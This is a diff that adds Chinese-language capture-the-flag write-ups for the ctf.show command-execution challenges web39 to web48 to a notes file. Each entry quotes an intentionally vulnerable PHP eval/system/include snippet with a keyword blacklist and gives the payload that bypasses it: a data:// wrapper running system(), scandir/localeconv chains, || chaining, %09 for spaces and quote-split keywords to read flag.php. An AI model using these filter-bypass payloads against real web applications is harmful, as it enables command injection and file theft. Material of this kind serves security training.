@@ -852,6 +852,307 @@ if(isset($_GET['c'])){
 ### web39
 
 ```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 06:13:21
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+
+//flag in flag.php
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/flag/i", $c)){
+        include($c.".php");
+    }
+        
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+收到一个名为c的GET请求，然后如果里面没有flag，那就给它后面加个.php包含它,其实如果结尾闭合了可以不管这个尾巴。
+
+payload:
+
+?c=data://text/plain,<?=system("tac%20f*");?>
+
+
+
+### web40
+
+```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 06:03:36
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+
+
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
+        eval($c);
+    }
+        
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+搁这全武行呢？过滤了数字，~，`，@，#，$，%，^，&，*，()，-，=，+，{}，[]……
+
+个人评价是：?c=echo%20highlight_file(next(array_reverse(scandir(pos(localeconv())))));
+
+什么嘛，那是中文括号，吓我一跳。
+
+
+
+### web41
+
+```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: 羽
+# @Date:   2020-09-05 20:31:22
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:40:07
+# @email: 1341963450@qq.com
+# @link: https://ctf.show
+
+*/
+
+if(isset($_POST['c'])){
+    $c = $_POST['c'];
+if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
+        eval("echo($c);");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+POST请求，上bp
+
+本题给出了一个脚本，可用于从ASCII中从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符。
+
+用那个脚本即可得到结果，与此同时，如果以后还有**没有过滤或运算**的命令执行时，均可以用它来生成可执行结果并跑出结果。
+
+![](.\命令执行\web41.png)
+
+脚本已同步于Github的script仓库中。
+
+
+
+### web42
+
+> 关于shell的重定向命令
+>
+> 标准输入，值为0，从磁盘获得输入
+>
+> 标准输出，值为1，输出到屏幕
+>
+> 错误输出，值为2，输出到屏幕
+>
+> 对应着/proc/self/fd/**x**，**x**为上面对应的值
+
+现在看题，重点在于> /dev/null 2>&1
+
+/dev/null为linux系统回收站，数据会被直接丢弃
+
+2>&1则是将错误输出重定向到标准输出，如此一来便不会回显到显示器上。
+
+所以采用命令把flag打印出来，利用；分隔分化一下命令，如此便能使其回显出来。
+
+本题中输入?c=ls;ls，显示文件目录
+
+?c=tac flag.php;ls，拿到flag
+
+
+
+### web43
+
+```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:32:51
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+这次不许有分号，也不许有cat。tac不受影响，分号的分化分割作用可以用||代替。
+
+payload:?c=tac flag.php ||
+
+
+
+### web44
+
+```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:32:01
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/;|cat|flag/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+新增对flag的过滤，那就先正则匹配
+
+payload:?c=tac f* ||
+
+
+
+### web45
+
+```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:35:34
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| /i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+这次加了一个空格。空格可以用url编码的TAB代替，即%09
+
+payload:?c=tac%09f*||
+
+
+
+### web46
+
+```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:50:19
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+这次增加了对数字,$和*的过滤。
+
+payload:?c=tac%09fla''g.php||
+
+
+
+### web47
+
+```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:59:23
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+啊这……tac无所畏惧
+
+payload:?c=tac%09fl''ag.php||
+
+
+
+### web48
+
+```
 
 ```
 
@@ -859,9 +1160,9 @@ if(isset($_GET['c'])){
 
 ## 文件包含
 
-### web78
-
 文件包含系列开始
+
+### web78
 
 网站源码为：
 
